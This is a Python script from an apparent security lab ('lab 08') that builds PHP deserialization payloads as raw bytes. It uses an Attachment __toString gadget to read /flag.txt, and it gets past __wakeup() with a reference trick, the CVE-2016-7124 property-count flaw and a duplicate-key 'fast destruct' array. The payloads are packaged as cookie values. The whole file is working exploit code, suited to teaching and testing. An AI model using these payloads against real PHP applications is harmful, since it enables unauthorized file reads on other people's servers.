"""Serialized payload construction for lab 08. Python 3 standard library only.

Everything is assembled from raw bytes: the whole point of the lab is the exact
byte layout of the `O:` header and of the `R:` reference token, and no PHP
serializer will emit either of the two payloads below.
"""

import base64
import os
import urllib.parse

FLAG_PATH = b"/flag.txt"

#: One nonce per interpreter run. The spool is append-only, so a constant label
#: would let an entry written by an *earlier* request (an earlier run, or a
#: payload someone planted by hand) be attributed to the stage running now --
#: which gives both false passes and false failures. Every label is therefore
#: unique to this process.
RUN_NONCE = os.urandom(4).hex().encode()


def label(base: bytes) -> bytes:
    """`base` plus this run's nonce, e.g. b"m-ref" -> b"m-ref-1a2b3c4d"."""
    return base + b"-" + RUN_NONCE


def php_str(raw: bytes) -> bytes:
    """s:<len>:"<bytes>";"""
    return b's:%d:"%s";' % (len(raw), raw)


def attachment(label: bytes, path: bytes = FLAG_PATH) -> bytes:
    """Attachment{path, label} -- the terminal gadget (__toString)."""
    return (
        b'O:10:"Attachment":2:{'
        + php_str(b"path") + php_str(path)
        + php_str(b"label") + php_str(label)
        + b"}"
    )


def attachment_list(label: bytes) -> bytes:
    return b"a:1:{i:0;" + attachment(label) + b"}"


def draft(props: bytes, declared: int = 3) -> bytes:
    """O:12:"DraftMessage":<declared>:{<props>}

    `declared` is the property count written into the header. Setting it higher
    than the number of properties that actually follow is CVE-2016-7124.
    """
    return b'O:12:"DraftMessage":%d:{%s}' % (declared, props)


def payload_naive(label: bytes) -> bytes:
    """The payload a beginner writes. __wakeup() scrubs `attachments` to null."""
    return draft(
        php_str(b"subject") + php_str(b"hello")
        + php_str(b"body") + php_str(b"")
        + php_str(b"attachments") + attachment_list(label)
    )


def payload_reference(label: bytes) -> bytes:
    """The reference trick (Paul Axe, WCTF 2019 "P Door" / inhann 2022).

    The attachment array is parked in `subject`, and `attachments` is declared
    as `R:2;` -- a PHP *reference* to the value stored at index 2 of the
    unserializer's value table, i.e. the zval behind `subject`.

    Value-table indices are 1-based and assigned in parse order:
        1 -> the DraftMessage object itself
        2 -> the value of its first property (subject)
        3 -> ... etc.

    __wakeup() then does the work for us:
        $label = $this->subject;   // reads the array out through the reference
        ... $this->$k = null ...   // nulls the *shared* zval: both die
        $this->subject = $label;   // writes the array back into the shared zval
                                   // -> `attachments` is alive again
    """
    return draft(
        php_str(b"subject") + attachment_list(label)
        + php_str(b"body") + php_str(b"")
        + php_str(b"attachments") + b"R:2;"
    )


def payload_cve_2016_7124(label: bytes) -> bytes:
    """One byte: the header claims 4 properties, only 3 follow.

    On PHP < 5.6.25 / < 7.0.10 the property loop runs out of input, returns
    failure, and the early `return` skips the __wakeup() call entirely -- while
    the fully populated object is still registered for destruction.
    """
    return draft(
        php_str(b"subject") + php_str(b"hello")
        + php_str(b"body") + php_str(b"")
        + php_str(b"attachments") + attachment_list(label),
        declared=4,
    )


def payload_fast_destruct(label: bytes) -> bytes:
    """The "fast destruct" folklore: a duplicate array key drops the only
    reference to the object while unserialize() is still running, so its
    destructor is supposed to fire before the deferred __wakeup()."""
    return (
        b"a:2:{i:0;"
        + payload_naive(label)
        + b"i:0;i:1;}"
    )


def as_cookie(blob: bytes) -> str:
    """base64 + percent-encoding: PHP url-decodes cookie values, and a raw '+'
    inside base64 would be eaten by that decoder."""
    return urllib.parse.quote(base64.b64encode(blob).decode(), safe="")
